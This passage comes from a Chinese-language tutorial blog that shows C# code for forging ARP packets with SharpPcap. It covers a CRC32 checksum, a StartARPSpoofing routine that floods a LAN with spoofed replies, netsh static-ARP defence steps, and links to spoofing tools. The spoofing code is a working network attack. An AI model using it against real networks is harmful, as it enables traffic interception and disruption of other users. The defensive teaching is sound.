  <span class="token number">0x119b4be9</span><span class="token punctuation">,</span> <span class="token number">0x155a565e</span><span class="token punctuation">,</span> <span class="token number">0x18197087</span><span class="token punctuation">,</span> <span class="token number">0x1cd86d30</span><span class="token punctuation">,</span> <span class="token number">0x029f3d35</span><span class="token punctuation">,</span> <span class="token number">0x065e2082</span><span class="token punctuation">,</span> <span class="token number">0x0b1d065b</span><span class="token punctuation">,</span> <span class="token number">0x0fdc1bec</span><span class="token punctuation">,</span>

  <span class="token number">0x3793a651</span><span class="token punctuation">,</span> <span class="token number">0x3352bbe6</span><span class="token punctuation">,</span> <span class="token number">0x3e119d3f</span><span class="token punctuation">,</span> <span class="token number">0x3ad08088</span><span class="token punctuation">,</span> <span class="token number">0x2497d08d</span><span class="token punctuation">,</span> <span class="token number">0x2056cd3a</span><span class="token punctuation">,</span> <span class="token number">0x2d15ebe3</span><span class="token punctuation">,</span> <span class="token number">0x29d4f654</span><span class="token punctuation">,</span>

  <span class="token number">0xc5a92679</span><span class="token punctuation">,</span> <span class="token number">0xc1683bce</span><span class="token punctuation">,</span> <span class="token number">0xcc2b1d17</span><span class="token punctuation">,</span> <span class="token number">0xc8ea00a0</span><span class="token punctuation">,</span> <span class="token number">0xd6ad50a5</span><span class="token punctuation">,</span> <span class="token number">0xd26c4d12</span><span class="token punctuation">,</span> <span class="token number">0xdf2f6bcb</span><span class="token punctuation">,</span> <span class="token number">0xdbee767c</span><span class="token punctuation">,</span>

  <span class="token number">0xe3a1cbc1</span><span class="token punctuation">,</span> <span class="token number">0xe760d676</span><span class="token punctuation">,</span> <span class="token number">0xea23f0af</span><span class="token punctuation">,</span> <span class="token number">0xeee2ed18</span><span class="token punctuation">,</span> <span class="token number">0xf0a5bd1d</span><span class="token punctuation">,</span> <span class="token number">0xf464a0aa</span><span class="token punctuation">,</span> <span class="token number">0xf9278673</span><span class="token punctuation">,</span> <span class="token number">0xfde69bc4</span><span class="token punctuation">,</span>

  <span class="token number">0x89b8fd09</span><span class="token punctuation">,</span> <span class="token number">0x8d79e0be</span><span class="token punctuation">,</span> <span class="token number">0x803ac667</span><span class="token punctuation">,</span> <span class="token number">0x84fbdbd0</span><span class="token punctuation">,</span> <span class="token number">0x9abc8bd5</span><span class="token punctuation">,</span> <span class="token number">0x9e7d9662</span><span class="token punctuation">,</span> <span class="token number">0x933eb0bb</span><span class="token punctuation">,</span> <span class="token number">0x97ffad0c</span><span class="token punctuation">,</span>

  <span class="token number">0xafb010b1</span><span class="token punctuation">,</span> <span class="token number">0xab710d06</span><span class="token punctuation">,</span> <span class="token number">0xa6322bdf</span><span class="token punctuation">,</span> <span class="token number">0xa2f33668</span><span class="token punctuation">,</span> <span class="token number">0xbcb4666d</span><span class="token punctuation">,</span> <span class="token number">0xb8757bda</span><span class="token punctuation">,</span> <span class="token number">0xb5365d03</span><span class="token punctuation">,</span> <span class="token number">0xb1f740b4</span>

<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 计算CRC32码</span>
<span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">uint</span></span> <span class="token function">GetCRC32</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token class-name"><span class="token keyword">uint</span></span> iCount <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint</span><span class="token punctuation">)</span>bytes<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>
	<span class="token class-name"><span class="token keyword">uint</span></span> crc <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">uint</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> iCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		crc <span class="token operator">=</span> <span class="token punctuation">(</span>crc <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">^</span> crcTable<span class="token punctuation">[</span><span class="token punctuation">(</span>crc <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">^</span> bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> crc<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后将计算得出的CRC32码粘到构造好的包尾就可以了。</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code><span class="token comment">//计算CRC32校验码</span>
<span class="token class-name">UInt32</span> u <span class="token operator">=</span> <span class="token function">GetCRC32</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> crc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">//Uint转Byte[4] CRC32 is Unit To Byte[4]</span>
crc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
crc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
crc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
crc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//填充FCS校验位</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> crc<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	p1<span class="token punctuation">[</span>p1<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> crc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> p1<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>到此，ARP数据包的构造就算完成了。</p><p>最后要实现ARP的欺骗，只要利用SharpPacp提供的发包方法，在线程中疯狂发包就可以了。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/// &amp;lt;summary&amp;gt;
/// arp欺骗：对内网PC进行欺骗
/// &amp;lt;/summary&amp;gt;
/// &amp;lt;param name=&quot;getwayIP&quot;&amp;gt;&amp;lt;/param&amp;gt;
/// &amp;lt;param name=&quot;wrongMac&quot;&amp;gt;&amp;lt;/param&amp;gt;
/// &amp;lt;param name=&quot;destIP&quot;&amp;gt;&amp;lt;/param&amp;gt;
/// &amp;lt;param name=&quot;destMac&quot;&amp;gt;&amp;lt;/param&amp;gt;
public void StartARPSpoofing(string senderIP, string recipientIP,string senderMAC,string recipientMAC)
{
	mIP = IPTOBYTE(recipientIP);
	sIP = IPTOBYTE(senderIP);
	mMAC = MACTOBYTE(recipientMAC);
	sMAC = MACTOBYTE(senderMAC);

	//构造ARP欺骗包
	packet = getPacket(sIP, mIP, sMAC, mMAC);

	//初始化发包线程
	sendThread = new Thread(SendPack);
	//启动线程
	sendThread.Start();
}
/// &amp;lt;summary&amp;gt;
/// 发送数据
/// &amp;lt;/summary&amp;gt;
public void SendPack()
{
	_device.Open();
	var timeoutDateTime = DateTime.Now + timeout;

	//发送数据包
	while (true)
	{
		_device.SendPacket(packet);
		time++;
		// 通知事件 -更新发包次数
		if (ResolvedEvent != null)
		{
			ResolvedTimeEvent(this, time);
		}
		Thread.Sleep(100);  //线程休眠100ms
	}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="正文-如何防御arp欺骗" tabindex="-1"><a class="header-anchor" href="#正文-如何防御arp欺骗" aria-hidden="true">#</a> 正文：如何防御ARP欺骗</h2><p>ARP欺骗是通过重复应答实现的，那么只需要在本机添加一条静态的ARP映射，这样就不需要询问网关MAC地址了，这种方法只对主机欺骗有效。对于网关欺骗还需要在网关中也添加一条到主机的静态ARP映射。 1.用管理身份运行命令提示符；输入netsh i i show in，查看一下本机有哪些网络连接</p><div class="language-Shell line-numbers-mode" data-ext="Shell"><pre class="language-Shell"><code>netsh i i show in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="/assets/6-6254fa88.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>2.查看一下网关的MAC地址。注意如果正遭受ARP欺骗攻击，通过此方法查处的可能是虚假的MAC地址。输入arp -a命令查询本机的arp映射表，如果找不到网关的信息，可以先ping一下网关。</p><figure><img src="data:image/png;base64,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" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>3.输入：netsh -c &quot;i i&quot; add neighbors 连接的Idx号 网关IP 网关MAC 添加一条静态映射,我已经添加过了，所以会显示 对象已存在</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code>netsh <span class="token operator">-</span>c <span class="token string">&quot;i i&quot;</span> <span class="token keyword">add</span> neighbors 连接的Idx号 网关IP 网关MAC
netsh <span class="token operator">-</span>c <span class="token string">&quot;i i&quot;</span> <span class="token keyword">add</span> neighbors <span class="token number">9</span> <span class="token number">10.60</span><span class="token number">.12</span><span class="token number">.1</span> 4c<span class="token operator">-</span>5e<span class="token operator">-</span>0c<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">73</span><span class="token operator">-</span>f5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAoEAAAAoCAMAAAC2AdCFAAAACVBMVEUMDAzNzc1VW2HEAUs+AAAEAUlEQVR42u2bW5KjMAxFfbL/RU93OgRZD2NDkvnIVU1NGgPGj4N1JaDBrclk/89EoEwEykSgTCYCZSLwC3p7/3d+v+wzBHJ9ngWgbIVAfi0g9FNEu5fDZxDcmvH45V0E+v5s21cJhKuTQT6SZYPz4wkVMTNFEE8cd2wvJ6unqK6/zi+BhCq2H/IZOxpsTgNiKJmuZ3reMfdWVsMIwHLO65ZMneL7T0akbxhurNzxJEjMjBmrvoH8Fgnz6K5LWAMPCVyljHOLZGw5U+d/xHOyfrHVUyi65stZPD5pwhKB1VQwqI/0PBKafwgkdUdXCDwccyY85ehAEXiNwHxezxMY60vdczqpMwQ+1VkzOm338/fy9veX9QPb9uOgfT+93sPqAsI67K7b3Pl3Ygv50kodMnGU9YL+wi2Oh63HtYuG1WfPMfH6e55Ao5MpoRjesiQ9B1IdaRrhyvfpZgLAXB72BHpW6ajduu285bPUDxctPT7b/9ibKFvidcP5eJdgQhlm1mCGuqzSNaN2YffjvBLk9UV3lhNIrbPKRa/yM+zjFfpryu3OZ7kt6yOMTh7iVqZ+WnIC277otWOiNvzK25lw1YJAu/RFPZESOKdTThHYKeeCmCGB1R1IFaDCtBceEzjs4NHNObxeoduXl2JmCNzd+xGBPN01WVZgz4L0RO/3GP20kM4AmZd/J4HQpghM2tUmCEyzFS8hcFzrJntKAgt1UBJIns6rdGAgMJ1B1gjM9Fu/miarIy5CilkYihFgeM++isBDL1y0i4KUNMvEGwjkeCho4zVtpXzYDI7KNwLJMowDAr0+IGkRjkCi6+288NBbMTy/lcHdNR0IvXRrTHhhvzZHHVioh0rR+2sH/dUKn3GQkSbRoaN2ZXfPSQIJz0TagMA9hDX/bVFsc0q0U9WJ1/US9VnbX4RIcwrYXdeeH9o1HwvDYLuPdlvXXztEvl305O2dC7Fwn1Io02rmSDc70JJym2sglqdRaRX7F/l4hsmC8CgnH2cfC7/0ucah//8C4/u6fGW0PkAgfN2gIgDPEcg0f7yaWJkIdGkCK+rAR9wiUPZGAhlHUL0JQNlVAsNTE5JFr/bSKZEy2ZzdbreNqT1VXr4eVepEcSc7uwbuBLaYTvY5dvsUA5/+E4ayM2vgPSPt3wtwPjUjMPkVgbKzXpjw9iq50ut30h8sAmWnY+H+MXD/JLN8wxazrUBE9joCtxd7i6wMzRJH8OEy2XIkQgg5qD7FS3Vf2BaMspVIxH8etH0knKyBzBCoL79la144eSnMelcRKHtvLByf9rrvfFYJlBeWrUYiNsZ9fmK4s5QlCOmI01M52XUC598qrb6hlskuESiTiUCZCJTJRKDsW+wfhJkG3tHRV+MAAAAASUVORK5CYII=" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="参考资料" tabindex="-1"><a class="header-anchor" href="#参考资料" aria-hidden="true">#</a> 参考资料</h2><p><a href="http://sharppcap.sourceforge.net/htmldocs/index.html" target="_blank" rel="noopener noreferrer">SharpPcap官方文档<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a><a href="https://github.com/chmorgan/packetnet" target="_blank" rel="noopener noreferrer">PacketDotNet<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>（使用PacketDotNet可以很方便的构造出数据包，只需几个参数） <a href="https://gitee.com/week233/SharpPcapTool_back.git" target="_blank" rel="noopener noreferrer">SharpPcapTool<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>（大神写的局域网欺骗工具，有个大坑，没有做物理机的虚拟机网卡过滤，当遍历到虚拟机网卡的网关IP时会抛异常，因为VMware的虚拟机网卡没有网关地址） <a href="https://gitee.com/week233/ARPAttack.git" target="_blank" rel="noopener noreferrer">牢底坐穿工具箱<span><svg 